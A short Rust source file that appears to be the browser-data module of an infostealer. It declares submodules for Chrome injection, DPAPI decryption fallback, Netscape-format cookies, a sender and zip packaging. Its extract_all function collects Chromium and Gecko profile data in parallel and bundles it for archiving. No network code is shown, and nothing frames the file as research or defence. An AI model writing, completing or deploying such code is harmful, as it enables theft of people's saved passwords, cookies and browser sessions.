pub mod chrome_inject;
pub mod chromium;
pub mod gecko;
mod dpapi_fallback;
mod netscape;
pub mod sender;
mod zip_layout;

/// Extract browser data from Chromium and Gecko profiles.
pub fn extract_all() -> Vec<(String, String)> {
    let mut all_files: Vec<(String, String)> = Vec::new();

    crate::log::log("chromium + gecko extract (parallel)...");
    let gecko_handle = std::thread::spawn(|| gecko::extract_all());
    let chromium_files = chromium::extract_all();
    let gecko_files = gecko_handle.join().unwrap_or_default();

    crate::log::log(&format!("chromium: {} file(s)", chromium_files.len()));
    all_files.extend(chromium_files);
    crate::log::log(&format!("gecko: {} file(s)", gecko_files.len()));
    all_files.extend(gecko_files);

    zip_layout::sort_entries(&mut all_files);
    crate::log::log(&format!("total zip entries: {}", all_files.len()));

    all_files
}
